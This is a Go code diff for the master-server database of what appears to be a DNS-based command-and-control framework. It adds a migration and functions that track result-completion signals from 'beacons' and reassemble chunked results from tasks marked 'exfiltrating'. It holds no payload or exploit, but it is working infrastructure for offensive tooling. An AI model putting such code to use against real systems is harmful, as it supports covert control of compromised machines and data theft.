@@ -17,7 +17,7 @@ import (
 
 const (
 	// MasterDatabaseSchemaVersion tracks the current schema version
-	MasterDatabaseSchemaVersion = 6
+	MasterDatabaseSchemaVersion = 7
 )
 
 // MasterDatabase wraps the SQL database connection for the master server
@@ -166,6 +166,13 @@ func (d *MasterDatabase) applyMigrations(fromVersion int) error {
 		}
 	}
 
+	// Migration 7: Track pending task completions when completion signal arrives before data
+	if fromVersion < 7 {
+		if err := d.migration7AddPendingCompletionTable(); err != nil {
+			return fmt.Errorf("migration 7 failed: %w", err)
+		}
+	}
+
 	// Record schema version
 	_, err := d.db.Exec(`
 		INSERT INTO schema_version (version, applied_at, description)
@@ -173,6 +180,84 @@ func (d *MasterDatabase) applyMigrations(fromVersion int) error {
 	`, MasterDatabaseSchemaVersion, time.Now().Unix(), "Master server schema updated")
 
 	return err
+}
+
+// migration7AddPendingCompletionTable tracks completion signals that arrive before result data
+func (d *MasterDatabase) migration7AddPendingCompletionTable() error {
+	_, err := d.db.Exec(`
+		CREATE TABLE IF NOT EXISTS pending_task_completions (
+			task_id TEXT PRIMARY KEY,
+			beacon_id TEXT,
+			total_chunks INTEGER NOT NULL,
+			created_at INTEGER NOT NULL,
+			FOREIGN KEY (task_id) REFERENCES tasks(id) ON DELETE CASCADE
+		);
+
+		CREATE INDEX IF NOT EXISTS idx_pending_task_completions_created_at
+		ON pending_task_completions(created_at);
+	`)
+
+	return err
+}
+
+// recordPendingCompletion tracks a completion signal that arrived before result data
+func (d *MasterDatabase) recordPendingCompletion(taskID, beaconID string, totalChunks int) {
+	if taskID == "" {
+		return
+	}
+
+	if totalChunks < 0 {
+		totalChunks = 0
+	}
+
+	_, err := d.db.Exec(`
+		INSERT INTO pending_task_completions (task_id, beacon_id, total_chunks, created_at)
+		VALUES (?, ?, ?, ?)
+		ON CONFLICT(task_id) DO UPDATE SET
+			beacon_id = excluded.beacon_id,
+			total_chunks = excluded.total_chunks,
+			created_at = excluded.created_at
+	`, taskID, beaconID, totalChunks, time.Now().Unix())
+
+	if err != nil {
+		fmt.Printf("[Master DB] Error recording pending completion for %s: %v\n", taskID, err)
+	}
+}
+
+// clearPendingCompletion removes any pending completion tracking for a task
+func (d *MasterDatabase) clearPendingCompletion(taskID string) {
+	if taskID == "" {
+		return
+	}
+
+	if _, err := d.db.Exec(`DELETE FROM pending_task_completions WHERE task_id = ?`, taskID); err != nil {
+		fmt.Printf("[Master DB] Error clearing pending completion for %s: %v\n", taskID, err)
+	}
+}
+
+// getPendingCompletion retrieves pending completion metadata if it exists
+func (d *MasterDatabase) getPendingCompletion(taskID string) (string, int, bool) {
+	if taskID == "" {
+		return "", 0, false
+	}
+
+	var beaconID sql.NullString
+	var totalChunks int
+	err := d.db.QueryRow(`
+		SELECT beacon_id, total_chunks
+		FROM pending_task_completions
+		WHERE task_id = ?
+	`, taskID).Scan(&beaconID, &totalChunks)
+
+	if err == sql.ErrNoRows {
+		return "", 0, false
+	}
+	if err != nil {
+		fmt.Printf("[Master DB] Error fetching pending completion for %s: %v\n", taskID, err)
+		return "", 0, false
+	}
+
+	return beaconID.String, totalChunks, true
 }
 
 // migration1InitialSchema creates the initial master database schema
@@ -1355,6 +1440,7 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 		if chunkCount == totalChunks {
 			// We have all chunks! Trigger reassembly in goroutine to avoid blocking other submissions
 			fmt.Printf("[Master DB] ✓ All %d chunks received for task %s, triggering async reassembly...\n", totalChunks, taskID)
+			done := make(chan struct{})
 			go func() {
 				defer func() {
 					if r := recover(); r != nil {
@@ -1369,27 +1455,23 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 					}
 				}()
 
-				// Set up timeout for reassembly (30 seconds should be plenty)
-				done := make(chan bool, 1)
-				go func() {
-					d.reassembleChunkedResult(taskID, beaconID, totalChunks)
-					done <- true
-				}()
-
-				select {
-				case <-done:
-					// Reassembly completed successfully
-				case <-time.After(30 * time.Second):
-					fmt.Printf("[Master DB] ⚠️  Reassembly timeout for task %s after 30s\n", taskID)
-					// Mark task as partial - reassembly took too long
-					now := time.Now().Unix()
-					d.db.Exec(`
-						UPDATE tasks 
-						SET status = 'partial', completed_at = ?, updated_at = ?
-						WHERE id = ? AND status != 'completed'
-					`, now, now, taskID)
-				}
+				d.reassembleChunkedResult(taskID, beaconID, totalChunks)
+				close(done)
 			}()
+
+			select {
+			case <-done:
+				// Reassembly completed successfully
+			case <-time.After(30 * time.Second):
+				fmt.Printf("[Master DB] ⚠️  Reassembly timeout for task %s after 30s\n", taskID)
+				// Mark task as partial - reassembly took too long
+				now := time.Now().Unix()
+				d.db.Exec(`
+					UPDATE tasks 
+					SET status = 'partial', completed_at = ?, updated_at = ?
+					WHERE id = ? AND status != 'completed'
+				`, now, now, taskID)
+			}
 		} else if chunkCount > totalChunks {
 			// This shouldn't happen but log if it does
 			fmt.Printf("[Master DB] ⚠️  Warning: Task %s has %d chunks but expected %d (duplicate chunks from load balancing?)\n",
@@ -1400,6 +1482,37 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 				var minChunk, maxChunk int
 				d.db.QueryRow(`SELECT MIN(chunk_index), MAX(chunk_index) FROM task_results WHERE task_id = ? AND chunk_index > 0`, taskID).Scan(&minChunk, &maxChunk)
 				fmt.Printf("[Master DB] Task %s chunk range: %d-%d (missing %d chunks)\n", taskID, minChunk, maxChunk, totalChunks-chunkCount)
+			}
+		}
+	}
+
+	// If we already received RESULT_COMPLETE before this chunk arrived, finalize now
+	if chunkIndex == 1 {
+		pendingBeaconID, pendingTotalChunks, hasPending := d.getPendingCompletion(taskID)
+		if hasPending {
+			if pendingTotalChunks <= 0 {
+				pendingTotalChunks = 1
+			}
+
+			// Ensure this chunk reflects the expected total chunk count
+			if totalChunks == 0 || totalChunks != pendingTotalChunks {
+				_, updateErr := d.db.Exec(`
+					UPDATE task_results
+					SET total_chunks = ?, is_complete = CASE WHEN ? = 1 THEN 1 ELSE is_complete END
+					WHERE task_id = ? AND chunk_index = 1
+				`, pendingTotalChunks, pendingTotalChunks, taskID)
+				if updateErr != nil {
+					fmt.Printf("[Master DB] Error updating chunk totals for pending completion %s: %v\n", taskID, updateErr)
+				}
+			}
+
+			completionBeacon := beaconID
+			if completionBeacon == "" {
+				completionBeacon = pendingBeaconID
+			}
+
+			if err := d.MarkTaskCompleteFromBeacon(taskID, completionBeacon, pendingTotalChunks); err != nil {
+				fmt.Printf("[Master DB] Error finalizing pending completion for task %s: %v\n", taskID, err)
 			}
 		}
 	}
@@ -3028,6 +3141,7 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 	// If already completed, nothing to do
 	if status == "completed" {
 		fmt.Printf("[Master DB] Task %s already completed, ignoring duplicate RESULT_COMPLETE\n", taskID)
+		d.clearPendingCompletion(taskID)
 		return nil
 	}
 
@@ -3035,6 +3149,7 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 	if status == "exfiltrating" && resultSize > 0 {
 		fmt.Printf("[Master DB] Task %s has result in task_results (%d bytes), marking complete\n", taskID, resultSize)
 		d.markTaskCompleted(taskID)
+		d.clearPendingCompletion(taskID)
 		return nil
 	}
 
@@ -3107,6 +3222,7 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 			}
 
 			fmt.Printf("[Master DB] ✓ Task %s assembled and marked as completed (%d bytes)\n", taskID, len(assembledResult))
+			d.clearPendingCompletion(taskID)
 		} else {
 			fmt.Printf("[Master DB] Waiting for remaining chunks for task %s (%d/%d received)\n", taskID, receivedChunks, totalChunks)
 			// Return success - we'll wait for more chunks to arrive
@@ -3152,6 +3268,7 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 					// No chunk found at all - data coming from different DNS server
 					fmt.Printf("[Master DB] Task %s completion received but no result data yet (mesh routing - data coming from different DNS server)\n", taskID)
 					// Leave task in "exfiltrating" status - will be completed when data arrives
+					d.recordPendingCompletion(taskID, beaconID, totalChunks)
 					return nil
 				}
 			} else {
@@ -3172,6 +3289,7 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 		}
 
 		fmt.Printf("[Master DB] ✓ Task %s marked as completed (%d bytes)\n", taskID, resultSize)
+		d.clearPendingCompletion(taskID)
 	}
 
 	return nil
